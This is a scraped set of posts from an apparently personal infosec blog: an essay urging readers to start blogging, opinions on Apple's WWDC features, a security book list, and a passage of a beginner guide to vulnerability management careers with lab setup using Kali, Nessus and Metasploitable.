about your topic from your perspective. You will likely find that people can learn more from someone who is in a similar situation as them then from some expert who might not understand how a non-expert thinks. What if I say something incorrect or it isn‚Äôt written perfectly? : Perfection is the enemy of productivity. Don‚Äôt worry about being flawless, and don‚Äôt sweat the times you are incorrect. With any luck, someone will call you out on something you post that‚Äôs wrong and you will have a chance to learn from that mistake and you can update the post at that time! No one knows everything, not even the big names in your given industry or field. It‚Äôs ok to be wrong, and it‚Äôs also OK to change your mind, update/fix your content, etc‚Ä¶ I don‚Äôt know if I can post regularly : You don‚Äôt have to post every week. You don‚Äôt have to post every month. Just post when you have something to write about. Which as I‚Äôve mentioned before should be somewhat regularly as you are likely doing something or working on something that you could write about! It‚Äôs also perfectly acceptable to post something that is a work-in-progress, and add to it in increments as you work on finishing the complete piece. So Why Blog?OK, so hopefully some of your common fears have been allayed. Now let‚Äôs get into the reasons why I, and the reasons why YOU should start a blog. I should accentuate the fact that each of the items listed below I actively benefit from, and you can too! It gives meaning to the time you spend on things : Too often, I work on things which seemingly have a very trivial or only an incremental effect on my life or on my job. These efforts typically go unnoticed, unappreciated and/or undocumented. Instead of losing it to time, why not document what you did, how you did it, what you learned, etc‚Ä¶? In this way, it can serve as a historical record to be shared, to be remembered, to be referenced and to serve as a testament to the valuable time you spent on it. It can help you remember how you did something : Let your blog be a reference for yourself. In my career, and in my life, I have forgotten a lot of what I have learned. If I had taken the time to document these things, in my own way, with my own context, I‚Äôd have the best possible reference to go back and remember it all. Documenting can help you retain it long-term : Similar to the point above, the simple act of documenting/writing things will help you retain that knowledge long-term. Worst case scenario though, if you do end up forgetting, you have it documented! It can look good on a resume or as part of a professional portfolio : Having a place where you document your research and other work can impress current or future employers. This will supplement your resume by speaking to the skills and experience you claim you possess. It can help you network : Ultimately, when people do read your material, they may reach out to you. In those moments, you have an opportunity to make a meaningful connection either personally or professionally. Your content can help someone : If you‚Äôve learned something, chances are, you aren‚Äôt the only person in the world who didn‚Äôt know that thing. Which means, someone else out there can benefit from what you learned and how you learned it. It can trigger other bursts of creativity and productivity : As you write and as you create, you are likely to find new ideas, based on your previous or current ideas, will materialize. Good begets great, inspire yourself! You will likely learn more by creating : Some say the best way to learn is to teach. By teaching, or in this case, by documenting what you learn or what you are working on in such a way that it is consumable by others than yourself, you will in that process learn the material in a more robust way. In other words, for you to confidently teach something, you need to know it very well. So learn to create, create to teach and then teach to learn! It can help create a social/professional identity tied to YOU rather than where you work : What I mean here is, you can market yourself through your site rather than through something like Linkedin, Twitter or (*grumble*) your resume. Linkedin is focused on your job, this makes it hard to decouple your identity from your place of work. Twitter constrains you to short bursts of thought, limiting your range and depth. Your resume is the worst offender! It boxes you in to just a few pages where you hope to explain your professional worth. A website you own and control allows you to fully document and share who you are, what you can do, what you have done, etc‚Ä¶ It‚Äôs fun! : I‚Äôm not saying having a blog isn‚Äôt work, it is. But work can be fun. Especially when it‚Äôs done at your own pace and leisure. I personally get a lot of enjoyment out of maintaining my site. It can turn into something more : Who knows, your innocent, low-volume, professional-_ish_ blog could turn into something more. Maybe it becomes popular, maybe you can monetize it, maybe it will yield business opportunities, there is a lot of potential. This potential remains untapped unless you try. Secure your identity on the web : Don‚Äôt rely on traditional social media to be your identity on the web. Tie your identity to your domain. Read more about why this is important here. With All That SaidSo now that your fears are quelled and are now excited to reap the rewards of starting a blog, let me share a few ‚Äúgotchas‚Äù. It does take time : No surprise here, but yes, writing takes time. I personally feel the time it takes to document something is worth it though, given all the benefits. You may get wrapped up in it : What I mean is, you may end up spending more time than you had originally thought you would. This is both good and bad! I think it is a really productive and healthy outlet, but you need to be conscious of your other time commitments. You should put care and diligence into what you post : Though I have said that your material doesn‚Äôt need to be perfect, you still need to take care to post accurate and quality material. Ultimately, this will keep your brand in a healthy state. Wrap-UpSo that‚Äôs my pitch. Tons of people do it. You can do it. Your perspective is valuable. The benefits are immense. You should start a blog. So are you convinced? I‚Äôd love to hear about it! Let me know your blog idea or share your URL with me. If its an infosec-related blog, I‚Äôll even add it to my collection! Still not convinced? I‚Äôd like to hear about that too. Thanks for reading! Resources Get Blogging!

At first viewing, I felt this event was pretty lackluster. However, once I had the chance to mentally digest and dig more into some of the announced features, I decided there is a lot to be excited about! Some of my takeaways and opinions on the various additions across Apple‚Äôs OS lineup are listed below. * Many, if not most of the features listed in this section are not only coming to iPhone but also coming to iPad in the new version of iPadOS as well as to the Mac in macOS Monterey. The first thing I thought of when SharePlay (specifically the screen sharing feature) was announced was, ‚ÄúApple just reinvented remote tech support for the in-laws‚Ä¶‚Äù - also this. Now that I can invite anyone to FaceTime, I can finally include my poor green bubble friends/family in the video chat fun. This will help me cut down on the insane number of video-chatting apps I have on my devices (e. g. Slack, Messenger, Discord, Duo, Meet, Chat, Zoom, etc‚Ä¶) which have been necessary to accommodate the non-iPhone-wielders. The Shared with You feature for Photos which aggregates the pictures sent to you via iMessage, I can see being very useful depending on where they draw the line. I‚Äôm sure plenty of people get a lot of pictures (*cough* GIFs) that they don‚Äôt necessarily want junking up their Photos app. I personally share and receive a lot of articles and it would be pretty nice to have those aggregated for me in News / Safari. New Memoji - Do people use Memoji? The new Notification summary claims to leverage ‚Äúon-device intelligence‚Äù to order and prioritize your notifications. No chance (in my mind) that this can accurately order my notifications. I wonder if they‚Äôll allow me to manually order my notifications based on app? In any case, I am pretty conservative with what apps I allow to send me notifications in the first place so I don‚Äôt really need this support. The new Maps redesign looks really cool, I especially like the elevation visualization. I want to use Apple Maps, I really do. It‚Äôs just, I still don‚Äôt really have confidence in it. The new immersive walking instructions seems very useful as I NEVER know how to orient myself in situations like getting off at a metro stop. They‚Äôve redesigned the aesthetic of the Safari tab bar. I think the new design is fine, but I don‚Äôt really get why they feel the need to redesign this every year. Just leave tabs alone! Safari extensions are no longer just for Mac! This didn‚Äôt get a lot of air-time but I think this is one of the really awesome features from the event. Just take a look at the new 1Password extension interface! ID cards (i. e. Driver‚Äôs License) in the Apple Wallet app?! This is one step closer to getting rid of the wallet all together. I‚Äôm very much looking forward to this. This will require state-by-state buy-in though before it becomes practical. The new Key feature is interesting. I‚Äôm wondering if my existing August Smart Lock (from 2018) will support this. Similarly, I wonder if Tesla would ever add support for the Car keys feature. Live Text is a cool feature and one that I can see myself actually using. From pictures of recipes to whiteboards - there‚Äôs certainly practical use cases. Visual Look Up will be an awesome feature if it works well. I‚Äôd love to ID a plant or animal just with a picture. Not sure why they needed to rebrand iCloud as ‚ÄúiCloud+‚Äù. Why not just add features to iCloud and leave it with the same name? iCloud Private Relay is just Apple Tor yeah? Well since Tor is so secure this should be too right? =P. I‚Äôm curious who runs the relay nodes. Not explicitly announced, but I did see some new iOS widgets that I am interested in putting on my home screen. With new features added to Notes, it‚Äôs getting dangerously close to something I would switch to as my main note-taking app. I do love Simplenote but it‚Äôs getting harder to deny the advantages the native integration of the Notes app has. I like the idea of the new Focus feature but feel it‚Äôs so customizable that I think you‚Äôll actually just be more productive if you simply put your phone away when trying to focus on something rather than obsessing over different focus profiles for hours like I know I would. Siri now has on-device speech processing and offline support. This should hopefully alleviate some pain points with using the voice assistant. All together, I do think the iPad is getting a pretty decent productivity boost. The new Multitasking suite seems better. But‚Ä¶ the demo left me feeling a bit lost. It will definitely take some hands-on time to really get the hang of it. The biggest thing I wanted from iPadOS was widgets on the home screen. This was such an obvious thing and one that I really can‚Äôt believe didn‚Äôt ship when widgets first debuted. With the insane processing power of the latest gen, M1-enabled iPads, there really was no reason to not add it. App Library is dumb. It‚Äôs on iPad now. Meh. I think Quick Note is awesome! One other reason why I am thinking of moving to Notes as my primary notes app. I wish this feature was on iPhone as well. It would be cool if the screen sharing feature of FaceTime could be limited to a specific split-screened app on iPad. So we didn‚Äôt get Xcode for iPad. But we did get a souped up version of Swift Playgrounds. I think in time a more feature-filled, Xcode-like app will make its way to iPad, but for now, it‚Äôs Swift Playgrounds. Universal Control is a feature I will definitely use. I typically have two separate Mac devices and an iPad open on my desk and being able to control all from a single set of peripherals is a great idea‚Ä¶ The new macOS is bringing the ability to AirPlay to a Mac. What I really want is to AirPlay the screen of a MacBook Pro to a set of connected displays attached to a different Mac. Here‚Äôs my scenario - I have three displays connected to a desktop Mac Pro which is used as a ‚Äúpersonal‚Äù device. I also have a MacBook Pro that is a work machine. I would love to be able to leverage the screen real estate of the displays connected to my Mac Pro on my laptop without having to disconnect the displays and connect them to the MacBook Pro. Imagine if I could simply AirPlay three ‚Äúspaces‚Äù to the three remote displays? That would be amazing. Shortcuts on Mac has the potential to be really powerful. I wonder what support it will receive with respect to third-party developers making actions available to the app. The keynote had a video where a smart doorbell was rang and an Apple Watch immediately brought up a video view from the doorbell‚Äôs camera. I have an Apple Watch 4 so maybe I don‚Äôt realize how fast the recent gen Watches are, but the smoothness of bringing this live video feed up seems too good to be true in real-world use. Home key on the watch will be my favorite new Watch feature. Just *tap* and I‚Äôm into my house. Still don‚Äôt care about the Breathe app. There are new Sleep tracking features but I still don‚Äôt know when I would charge my Watch if I was using this. Next-hour precipitation alerts are nice. Walking Steadiness is completely ridiculous. I can‚Äôt wait for it to go off constantly when I am playing basketball. There are also some new features coming to tvOS this Fall. The most interesting of which is the ability to use HomePod Mini‚Äôs as speakers for your Apple TV.

Though I certainly haven‚Äôt read each of these cover-to-cover, I purchased each based on the good reviews they received and the value of their content relevant to my interests in information security. I‚Äôm always looking to learn and as such am continuously evaluating new books to add to my library. In this vein, I also maintain an Amazon list of books I am looking to potentially purchase. Book Library: Shopping List: Book Reviews: Below I share my thoughts on the books that I do use regularly or have read most of. The Web Application Hackers Handbook (2nd Edition)This book is truly the bible of web application hacking and though it has been superseded by PortSwigger‚Äôs Web Security Academy it‚Äôs content is still extremely relevant and a great resource for any appsec professional. With inline exercises and questions, it can be used not only as a spot reference but also as a textbook of sorts which could be read cover-to-cover (give yourself some time as it‚Äôs certainly a tome at 800+ pages). Can‚Äôt recommend this book enough! Bulletproof TLS and PKI, Second EditionCurrently working my way through the entirety of this book. I‚Äôve found it to be a pretty definitive guide on the inner-workings of TLS. The 2nd edition (I made the mistake of getting the first edition originally) has an extra section on TLS 1. 3 (at least) which is great. If you‚Äôre looking for a deep dive on underlying crypto mechanisms that TLS relies on you may need to find some additional references. " }, { "id": 83, "url": "https://shellsharks.com/vm-bootcamp", "title": "Vulnerability Management Bootcamp", "body": "2021/04/23 - Vulnerability Management is an excellent way to kick-start a career in cybersecurity. This guide will help show you the way. Jump to Section Why Vulnerability Management? What Do VM Professionals Actually Do? Bootcamp Intro VM Knowledge Pre-Requisites Bootcamp Lab Bootcamp Lab Exercise Answers Scenario-Based Exercises How to Find a VM Job Tackling the Interview Help &amp; Outro Why Vulnerability Management?Vulnerability Management (a. k. a. ‚ÄúVM‚Äù) is a less-considered, but in my opinion, ideal entry-level role for aspiring infosec professionals. For many who are looking to get into information security, finding that first job can be very difficult. Typical recommended paths into infosec include roles such as help desk, SIOC/SOC, system administration, network engineering or even software development. Though there is no one path that is universally best, I believe VM can be an optimal choice for a number of different reasons. Why Start Your Infosec Career with Vulnerability Management A lot of true infosec positions are not really considered ‚Äújunior‚Äù or ‚Äúentry-level‚Äù (e. g. penetration testing, threat hunting, reverse engineering, application security, etc‚Ä¶) This means it is difficult to jump directly into those roles without some prior experience in infosec. VM however, is considered junior and thus is more readily attainable by those with little-to-no prior infosec experience. Unlike other recommended ‚Äústarter‚Äù roles (i. e. help desk, system administration, etc‚Ä¶), VM is a true infosec role. What I mean by this is, having the title ‚ÄúVulnerability Management‚Äù (or some derivation of this title) on your resume counts towards years of experience in cybersecurity whereas having help desk (for example) experience on your resume would likely not be considered infosec-relevant experience. VM (in my opinion), is easier to learn the basics of as compared to other potential starter positions. Don‚Äôt get me wrong, you certainly need to have a breadth of knowledge in a number of different areas but you don‚Äôt (for example) need to be able to fully administer Linux/Windows, or engineer a network, or perform in-depth packet analysis, or be an expert coder to work in VM (though it wouldn‚Äôt hurt!). You need only have (at least starting out) a relatively foundational grasp of a handful of knowledge areas. Those in VM roles are exposed to a wide variety of other infosec domains. For example, in performing the week-to-week responsibilities of a VM analyst/engineer, you will encounter vulnerabilities that a penetration tester would also encounter, you may be asked to assess the risk of scan findings similar to what a GRC analyst would be asked to do, you could also be asked how to patch or mitigate issues like a system administrator would need to do, etc‚Ä¶ Collectively, these experiences are great for building a solid generalist base of knowledge and could also help you pivot into other areas of infosec if/when you are ready to do so. Penetration testing is a very sought-after infosec position but can be out-of-reach for many entry-level professionals. This is for good reason as penetration testing requires skills and experience that are a bit more advanced. VM is a great stepping-stone to a career in penetration testing as you get a lot of hands-on experience with the vulnerabilities you will be exploiting as a penetration tester. (NOTE: This statement is not meant to discourage those looking to get into penetration testing early in their careers. It certainly can be done!) VM analysts typically get a good bit of face-time across IT organizations. What I mean by this is that you will likely be asked to interface with a wide variety of groups within IT - server teams, desktop teams, development teams, IT leadership, etc‚Ä¶ This exposure helps network you around the organization and also gives you the opportunity to learn from a diverse set of personalities and professionals. VM is (or really should be) ubiquitous. Since VM is fundamental to all organizations, the need for qualified and/or knowledgeable VM professionals is abundant. In other words, there is a lot of opportunity in learning this particular craft. With that said, there is an increasing prevalence of out-sourced, managed VM which means this function may become more and more commoditized. VM Compared to Other Infosec Starter-RolesThere are a number of different ‚Äústarter‚Äù roles one could consider as they begin their journey into infosec. I personally believe VM is one of the better options as compared to these other roles. Some of the cons of these other roles are detailed below. In help desk roles, learning (specifically infosec-related learning) tends to stagnate, your ability to perform actual ‚Äúsecurity‚Äù work is limited, pay tends to be lower and opportunities to pivot into more security-specific roles are often non-existent or overly hard-fought. There also tends to be a stigma attached to ‚Äúhelp desk‚Äù which if you‚Äôre not careful, could hinder your ability to break out of that role and onto something more ‚Äúadvanced‚Äù. In SIOC/SOC or other blue-team-analyst-type roles, you get great exposure to ‚Äúreal‚Äù security work, but this often comes at the expense of jobs that are high stress, have weird/long hours and/or are very scripted in nature with respect to operational responsibilities, limiting the ability to learn and grow. A lot of individuals in these positions suffer from burn-out or other stress-related issues. In system administration roles, you learn a great deal about the OS (i. e. Windows, Linux, Mac) you are administering but do not necessarily get to perform any security-specific work. This experience certainly comes in handy later in an infosec career but might not help too much for breaking into the field initially. In network engineering roles, you can easily find yourself siloed into only performing network engineering and never getting to break out and do any actual security work. I‚Äôll add that this path requires quite a bit of technical depth on the networking side which makes this path particularly difficult for an entry-level individual. With that said, that knowledge could be of great use if/when you do ultimately move into a more security-specific position. Software development is a common first step for those who ultimately would like to end up in an ‚ÄúApplication Security‚Äù role. This makes sense considering knowing how to properly assess and secure applications likely means first having some understanding or experience writing/developing applications. With this said, it is a relatively serious commitment that must be made to become a software developer and is probably a bit over-kill if your goal is to quickly get into infosec-proper. Vulnerability Management Day-to-Day: If you‚Äôre with me thus far, you‚Äôre likely somewhat interested in a getting a job in Vulnerability Management. You may however be wondering, ‚Äúwhat exactly does someone in Vulnerability Management actually do?‚Äù This is of course a very relevant question for someone thinking of going down this path so I‚Äôd like to try and cover it here. Though it can certainly vary from place to place, VM professionals typically have responsibilities in three functional areas - operations, analysis and engineering. I‚Äôll briefly explain VM responsibilities across each of these domains below‚Ä¶ VM OperationsThough there are elements of VM analysis or engineering that could be considered operational, what I really mean by ‚Äúoperations‚Äù is, the every day break-fix, tuning and troubleshooting that a VM professional needs to do to keep scans running on-time and without failure as well as ensuring reports/alerts are being generated and delivered as required. Consider the list of potential operational tasks below‚Ä¶ Scan failures: If a scan fails to kick-off, finish or otherwise does not complete, the VM team will need to troubleshoot what happened. A scan may fail for a number of different reasons: the scanner itself may be malfunctioning, a firewall or IPS may be blocking scan traffic or the target endpoint could have shut off. These are just a few examples. False positives: Often, a system owner may contact the VM team because they believe a finding on a scan report is a false positive. It is then the VM team‚Äôs job to investigate this claim and determine whether it is indeed a false-positive or not. In my experience, especially when it comes to credentialed scans, it is very rarely a real false-positive. In any case, you will need to understand and be able to explain the scan plugin logic to the system owner that way there is a mutual understanding of why that plugin fired. Scan causes system degradation: Network scans can be somewhat invasive - both on the network as well as against a target host. Though modern operating systems and enterprise networks are fairly robust and thus less likely to have a negative reaction as a result of a common vulnerability scan, it is certainly still possible that a scan could cause network/system degradation. When this happens, the VM team may be contacted to disable the scan. Creating/maintaining scan jobs: One of the core tenets of VM is that of visibility. What this means is that to the best of our ability, we as the VM team would like to be scanning everything with the highest-fidelity (credentialed) scan type as possible. To achieve this, the VM team will often need to create additional scan jobs or modify existing ones as needed to further increase visibility. Credential failure: The highest-fidelity scan type is an authenticated scan. To achieve an authenticated scan you need proper credentials which have sufficient privileges on the target host. The scan job must then be populated with these credentials. For any number of reasons, scans may fail to actually login to the host. When this occurs, the VM team will need to diagnose what has happened and fix the scan. Report/alert tweaking: A key facet of VM is ensuring that appropriate stakeholders receive reports which detail the information and specific findings relevant to them. The VM team is therefore responsible for building and maintaining these reports, regularly auditing whether they are being sent and received properly and that they have the correct and comprehensive data contained within them. VM AnalysisMuch of the ‚Äúanalyst‚Äù work a VM professional does could be considered operational as it is something that might be performed on a day-to-day basis. However, I delineate between analysis work and operations based on the skillset needed to perform each. VM analysis is the process of reviewing scan results (and vulnerabilities in general) and performing analysis on these findings which leads to a better understanding of risk. This work stands in stark contrast to operations, which does not require having a deep understanding of threats, vulnerabilities and risk. Below are some examples of VM analysis work‚Ä¶ Creating dashboards/content: Enterprise scan tools have advanced dashboarding and other content-creation capabilities which allow VM analysts to quickly consume VM metrics, trends and other interesting data points related to organization-wide scan results. For example, the VM team may maintain a trend graph which shows the total high-risk vulnerabilities that have been present in the environment over the course of the year. Or, there may be a dashboard component which shows the number of outstanding vulnerabilities across each department within IT. Risk assessments: A common ask for the VM team is to produce a ‚Äúrisk assessment‚Äù related to a certain vulnerability against a specific system or as it applies to the organization as a whole. These risk assessments help IT leadership determine how to prioritize work. If the risk is high, business leaders and IT leadership must make decisions on risk mitigation. Triaging recently disclosed vulnerabilities: Often new vulnerabilities are disclosed and require speedy analysis from the VM team. In these cases network scan vendors will not have had time to write and publish detection plugins for their respective scanners. When this happens, the VM team will be asked to triage these new vulnerabilities to determine their applicability to the organization‚Äôs environment, calculate potential risk and even research/produce possible risk treatments related to that vulnerability. Vulnerability validation: Network scanners are great at identifying vulnerabilities. What they can‚Äôt always do however is determine the ‚Äútrue risk‚Äù of a vulnerability based on the relevant network/host-based controls which may mitigate certain aspects of the respective issue. The VM team may be asked to analyze a vulnerability in the context of whether it is truly a risk to the system. In some cases this may mean trying to actively exploit that particular vulnerability to determine if the expected controls which may mitigate said issue actually do so. Though I wouldn‚Äôt call this ‚Äúpenetration testing‚Äù, it is similar in some ways. Reviewing scan results: VM analysts may spend a good bit of time simply reviewing the results of scans and evaluating whether any vulnerabilities require special or immediate attention. For example, if a new class of high-risk vulnerability appears in a scan result which does not have automated alerting or reporting content, a VM analyst may want to quickly catch it so it can be triaged accordingly. VM EngineeringLast but certainly not least, we have VM engineering. Engineering in this context is the design, build and maintenance of the architecture and infrastructure which support VM operations and analysis. Some examples of VM engineering tasks are detailed below‚Ä¶ Patching: VM is supported by scanners, databases, central-consoles and a lot of other infrastructure. This infrastructure must be kept up-to-date with the latest functional/security patches from their respective vendors. The VM team may be responsible for maintaining their own tools in this way. In many cases however, the responsibility of patching, even for VM infrastructure, is placed on an organization-wide patching team rather than resting on the system-owners themselves. Archictecture: As advancements are made, or perhaps as the VM program is first being built, there is a need to design an architecture for the VM program itself - especially as it relates to scanning operations. The VM team is responsible for designing and deploying VM-related hardware, determining where scanners are placed on the network and much more. Scan routing: In order to scan all corners of an enterprise network, the VM team must work with the network team to ensure proper rules are in place on the firewalls such that the scanners can traverse the network. New tooling: As modern enterprises continue to make strides into new computing frontiers (e. g. cloud, microservices, serverless, etc. . ), the VM team must keep up with respect to maintaining scan comprehension and visibility. To do so, new tools will likely need to be evaluated. Typically, this is done through trial-based, proof-of-concept engagements. The VM team will acquire the tool(s) and a trial license and have a limited amount of time to evaluate a new product to determine if it meets the VM-needs of the organization. *Scripting &amp; Automation: This final task is something that I believe spans all three VM functional areas. In order to get the most out of the tools you have in your VM tool-kit and to best solve the ‚Äúscaling‚Äù issue within infosec, VM professionals must be able to write scripts and automate against RESTful APIs. These scripts will likely perform operational tasks and therefore the maintenance and creation of these scripts could be considered operational. Similarly, these scripts may perform automated analysis and triage of VM findings. In this way, these scripts can also be considered ‚Äúanalyst‚Äù work. Collectively, I think they are also engineering in that they are somewhat one-time efforts (not counting maintenance and upgrades) which help add new functionality to the VM program. As you can see! There is a lot of interesting work to be done in VM. Due to the breadth of responsibilties and the very nature of the work, I truly believe it is one of the best starter infosec roles out there. Now, let‚Äôs get into the bootcamp! Bootcamp IntroOK! So you‚Äôre excited to learn more about VM and are ready to dive in. This is great! I‚Äôd like to officially welcome you to the Shellsharks Vulnerability Management Bootcamp, I am happy to have you here. The primary goal of this bootcamp is to fully prepare someone to not only ace an entry-level Vulnerability Management interview and get offered the job, but to also prepare you to step in day 1 after being hired and immediately hit the ground running with respect to performing the responsibilities of a VM analyst. As such, the specific objectives for this bootcamp as well as what this bootcamp explicitly doesn‚Äôt cover are provided in the two separate lists below. Bootcamp Objectives Prepare you to ace an entry-level/junior VM interview, the outcome of which is (hopefully) a job offer. Provide real-world, hands-on, practical, lab-based VM experience which will equip you with the confidence and skills needed to perform VM analyst responsibilities immediately after starting your new job. What the Bootcamp Doesn‚Äôt Cover There are purposefully-open-ended, scenario-based questions at the end of the bootcamp lab. ‚ÄúAnswers‚Äù for these questions are not explicitly provided. In fact, these questions do not have one correct answer, rather they are designed to be more of an exploratory thought-exercise based on real-world challenges a VM analyst might be expected to solve. For more information on how best to approach solving these prompts, you are encouraged to contact me or start a discussion in the Shellsharks Discord. Here lies the necessary disclaimer that this ‚Äúbootcamp‚Äù does not guarantee that you will be given interview opportunities nor that by completing the bootcamp you will be 100% prepared for any and all questions/prompts you may encounter in a VM interview. I have, to the best of my ability, attempted to provide as much information, both purely academic as well as practical which aims to achieve the objectives set forth in the previous section. The goal of this bootcamp is not to make one an expert in all things VM. As such, there are many facets of VM that are only superficially covered or not mentioned at all. Expertise is developed over time and through years of experience and personal research. Though the goal of this piece is merely to introduce VM and give someone enough understanding to ace an interview, I am working on a more comprehensive compendium of VM knowledge - so stay tuned for that!Bootcamp Sections: The bootcamp is comprised of the following five sections‚Ä¶ Part 1: VM Knowledge Pre-RequisitesVulnerability Management, though ‚Äúentry-level‚Äù in many respects, still requires a level of foundational infosec knowledge. This section provides an accelerated course of study through these knowledge areas. This is delivered though both statically-defined tips as well as externally-sourced references. The expectation is to have a fundamental grasp of these concepts and be able to speak reasonably well about them in an interview. Part 2: VM Bootcamp LabThis is the main portion of the bootcamp which walks you through how to set up the lab environment and how to perform a variety of different processes and actions related to VM. In this section there are also provided exercises designed to test your knowledge and understanding along the way. These questions have answers provided. Ultimately, this section will help you demonstrate in an interview, your hands-on understanding of the tools and techniques of the VM trade. Part 3: Scenario-Based ExercisesAs described previously, the scenario-based questions are open-ended and designed to be exploratory topics rooted in real-world situations I have encountered in my years in the VM arena. I encourage those who have produced solutions to these questions to contact me or start a discussion in the Shellsharks Discord. By solving these challenges, you best prepare yourself for solving similar problems once ‚Äúon-the-job‚Äù. Part 4: Finding a Job in VMAfter you learn the basics but before you actually get an interview, you must first find actual VM jobs to apply to. This isn‚Äôt always straight-forward. This section will share some tips on how to best pinpoint VM-related jobs to apply to. Part 5: The InterviewFinally, I provide a list (that I will continue to contribute to) of likely interview questions you may encounter during an entry-level VM job interview. Accompanying each of these questions is one possible answer (or a reference which can help you understand the answer). These questions will cover a variety of topics but will mostly be sourced from the VM knowledge pre-reqs and the lab exercises. VM Knowledge Pre-RequisitesTo get started in VM, there are a handful of knowledge areas that are in my opinion critical to have a basis in. As it pertains to the objective of this bootcamp, understanding these fundamental areas will best equip you to succeed in a VM interview and execute from day one once accepting a VM job offer. This pre-requisite material is succinctly listed below, either as informational snippets or externally-linked references. Where possible, I summarize why or what specifically may be required for you to understand about a specific topic. The goal of which is to reduce the total amount of prep that is needed to simply ace an interview. Networking TCP ‚ÄúThree-Way Handshake‚Äù‚Äù - Understand SYN ‚Äì&gt; SYN/ACK ‚Äì&gt; ACK. OSI model - Know the layers in order and generally what they are responsible for. NMAP - Know what Nmap is and what some of the basic flags do. Port Scan Techniques (e. g.

Other ports and protocols may be asked about during an interview but the ones below makeup a majority of the popular ports/protocols. Protocol¬†¬† TCP/UDP¬†¬† Port # FTP TCP 20/21 SSH TCP 22 Telnet TCP 23 SMTP TCP 25 DNS TCP &amp; UDP¬† 53 DHCP UDP 67/68 HTTP TCP 80 POP3 TCP 110 NTP TCP 123 NetBIOS TCP 137/138/139 SNMP UDP 161 LDAP TCP 389 HTTPS TCP 443 SMB TCP 445 MySQL TCP 3306 RDP TCP 3389 Operating Systems Basic Windows CLI - Learn basic Windows CLI commands (e. g. ipconfig, netstat, ping, tracert, systeminfo, net use, regedit, net user, etc‚Ä¶) You may be asked about specific commands but more likely an interviewer will just ask you qualitatively, how ‚Äúfamiliar‚Äù you are with Windows. Basic Linux CLI - Learn basic Linux CLI commands (e. g. curl, ls, tail, cat, grep, ps, top, netstat, ifconfig, ip, df, du, id, chmod, nslookup, ping, etc‚Ä¶) You may be asked about specific commands but more likely an interviewer will just ask you qualitatively, how ‚Äúfamiliar‚Äù you are with Linux. Linux file directory structure (e. g. root, bin, cdrom, dev, etc, home, lib, media, mnt, opt, proc, run, sbin, tmp, etc‚Ä¶) - Understand what is typically found in each of these directories. SSH - What is SSH used for? I also recommend having SSH‚Äôed into something as practice. Windows Firewall - Just be mildly familiar. Linux Firewall / iptables - Just understand the basics. Understand that when designing a network scanning architecture within an organization, the scanners themselves must be whitelisted on any firewalls in order that they can scan devices residing behind those firewalls. Vulnerabilities OWASP Top 10 - Have some familiarity with and be able to define some of the vulnerabilities on this list (especially XSS, CSRF and SQLi).

Collectively, it is good to just be familiar with what tools are out there in the VM space. There really should be no expectation that you are an expert or have even used all of these. Risk Analysis CVSS - Understand how scores are calculated using the various CVSS metrics (e. g. base, temporal, environmental, etc‚Ä¶) Understand common mitigating/compensating controls (e. g. antivirus, IPS, application whitelisting, non-administrative accounts, etc‚Ä¶) The 20 CIS Controls are a good place to get a better understanding of some of these controls and how they reduce residual risk. The 5 Risk Mitigation Methods - Accept, Avoid, Control, Transfer, Monitor. Quantitative vs Qualitative Risk Analysis - Be able to do simple analyses using both of these methodologies. Compliance/Regulatory Frameworks *You need only have a high-level understanding of each of the following frameworks. Be able to describe what they are at a minimum. NIST 800-53 - Be familiar with some of the controls and at a high-level what this document is. NIST CSF - Identify, Protect, Detect, Respond, Recover.

REST APIs &amp; Scripting Python - Popular programming language. This is my recommended language for those getting into infosec. Learn a little Python - I recommend being familiar enough with Python that you could comfortably list it on your resume. This goes a long way in terms of standing out in an interview. REST - REST APIs are built into a lot of different security tools. Knowing what they are and how to use them is an invaluable skill and one that would really help you stand out in an interview. Writing against REST APIs in Python - Some information on how exactly to programmatically use a REST API using Python. Github - I recommend creating a Github account, writing a simple script or two (in Python for example) and making it publicly available on your Github. This will demonstrate to prospective employers your knowledge of scripting. An example of a possible script you could write will be covered in the bootcamp lab. Regex Regex Tutorial - Regex is used quite a bit in infosec. I recommend you know what it is so you can speak to it in an interview if necessary. Regex Tester(s) - regexr, regex101, regextester are handy tools when testing out Regex queries you have built. VM Bootcamp LabAlright! If you‚Äôve made it this far, you‚Äôre comfortable enough with the recommended pre-reqs and are ready to get into the hands-on portion of the bootcamp. The goal of these exercises is to give you real-world, practical experience you can reference on a resume. This should give you the credit and confidence needed to show well in a VM interview. To get started, I‚Äôve provided a list of what you will need to accomplish the bootcamp exercises. At the end of each lab exercise, there will be a series of questions designed to help test your knowledge and understanding. What You‚Äôll Need An Internet-accessible compute environment (e. g. computer, AWS, Azure, etc‚Ä¶) capable of running two virtual machines. If using a traditional computer, you‚Äôll need a virtualization hypervisor tool such as VMware, VirtualBox, or Parallels. A Linux VM (use a distribution of your choice - I personally recommend Kali Linux or Ubuntu). *The lab exercises will be done using Kali. A free license key for Nessus Essentials. A copy of Metasploitable 2. Bootcamp Lab Exercises Exercise 0: Lab Setup Exercise 1: Network Tools Primer Exercise 2: Discovery Scanning Exercise 3: Vulnerability Scanning Exercise 4: Scanning Enrichment Exercise 5: Reviewing/Analyzing Results Exercise 6: Reporting Exercise 7: Scripting &amp; Automation Bootcamp Lab Exercise AnswersExercise 0: Lab Setup: First, let‚Äôs get our lab environment set up so we can proceed through the bootcamp exercises. To start, we need to download a virtualization hypervisor such as VMware, VirtualBox, or Parallels. I will be using VMware Fusion during the exercises. Once the virtualization tool is downloaded and installed, we need to acquire a VM which will host our scanning tool and effectively be the scanner host. For this, I recommend a Linux variant such as Kali Linux or Ubuntu. I will be using Kali (64-bit) throughout the exercises. Offensive Security actually maintains VMware and VirtualBox-specific Kali images which I recommend using. *If you‚Äôve downloaded the pre-configured . vmwarevm from Offensive Security, you can simply double-click the (un-zipped) file and it should open up in VMware with no other setup required. Otherwise, once we have downloaded the VM, we need to unpack, install and perform the initial setup of the VM within our virtualization tool. Here is a guide for installing Kali inside VMware. When asked to name the VM, give it an appropriate name such as ‚ÄúScanner‚Äù. I recommend giving it as much RAM and CPU as you can spare. Scanning can be somewhat resource-intensive so the more power the VM has the better. Keep in mind, you will also need to run a second VM simultaneously so don‚Äôt spend all your computer‚Äôs resources in one place! The pre-configured . vmwarevm image from Offensive Security has 2GB RAM, and 80GB virtual hard drive, I think this is sufficient for this exercise. To start, have the VM configured in NAT mode (a. k. a. ‚ÄúShare with my Mac‚Äù on Mac devices). This is to ensure that the Kali VM is able to download updates and additional tools needed for the bootcamp exercises. To initially get into our Kali instance, use the credentials kali / kali. I recommend immediately changing your kali user password. Here is a guide on how to change a Linux password. 